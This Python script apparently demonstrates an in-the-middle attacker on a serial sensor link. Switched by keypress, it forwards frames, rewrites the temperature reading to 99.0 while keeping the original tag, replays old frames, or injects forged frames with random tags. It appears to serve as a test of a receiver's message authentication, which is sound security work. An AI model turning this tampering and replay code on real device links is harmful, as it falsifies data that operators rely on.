import os, time, msvcrt
import serial

PORT = "COM16"                    
ser = serial.Serial(PORT, 115200, timeout=0)

mode = "f"
last_frame = None
buf = bytearray()

def show(msg):
    print(time.strftime("%H:%M:%S"), msg, flush=True)

def extract():
    while buf and buf[0] != 0xA5:          
        buf.pop(0)
    if len(buf) < 5:
        return None
    ln = buf[4]
    if ln > 32:
        buf.pop(0)
        return None
    total = 25 + ln                         
    if len(buf) < total:
        return None
    frame = bytes(buf[:total])
    del buf[:total]
    return frame

def counter(fr):
    return int.from_bytes(fr[5:9], "big")

def suhu(fr):
    if fr[4] < 2:
        return None
    return int.from_bytes(fr[9:11], "big", signed=True) / 100

def tamper(fr):
    b = bytearray(fr)
    b[9:11] = (9900).to_bytes(2, "big")     
    return bytes(b)

def forge(ctr):
    payload = (9900).to_bytes(2, "big")
    hdr = bytes([0xA5, 0x01, 0x11, 0x22, len(payload)]) + ctr.to_bytes(4, "big")
    return hdr + payload + os.urandom(16)   

def handle(fr):
    global last_frame
    c, t = counter(fr), suhu(fr)
    if mode == "f":
        ser.write(fr)
        show(f"[teruskan]  ctr={c} suhu={t}")
    elif mode == "t":
        ser.write(tamper(fr))
        show(f"[UBAH DATA] ctr={c} suhu asli={t} -> 99.0 (tag asli dipertahankan)")
    elif mode == "r":
        ser.write(fr)
        show(f"[teruskan]  ctr={c} suhu={t}")
        if last_frame is not None:
            time.sleep(0.05)
            ser.write(last_frame)
            show(f"[REPLAY]    frame lama ctr={counter(last_frame)} dikirim ulang")
    elif mode == "p":
        ser.write(fr)
        show(f"[teruskan]  ctr={c} suhu={t}")
        time.sleep(0.05)
        ser.write(forge(c + 1000))
        show(f"[FRAME PALSU] ctr={c + 1000} suhu=99.0 dengan tag acak (tanpa kunci)")
    last_frame = fr

show("Penyerang aktif. Tombol: f=teruskan  t=ubah data  r=replay  p=frame palsu  q=keluar")
while True:
    if msvcrt.kbhit():
        k = msvcrt.getwch().lower()
        if k == "q":
            break
        if k in "ftrp":
            mode = k
            show(f"MODE -> {k}")
    data = ser.read(256)
    if data:
        buf.extend(data)
    while True:
        fr = extract()
        if fr is None:
            break
        handle(fr)
    time.sleep(0.001)
ser.close()
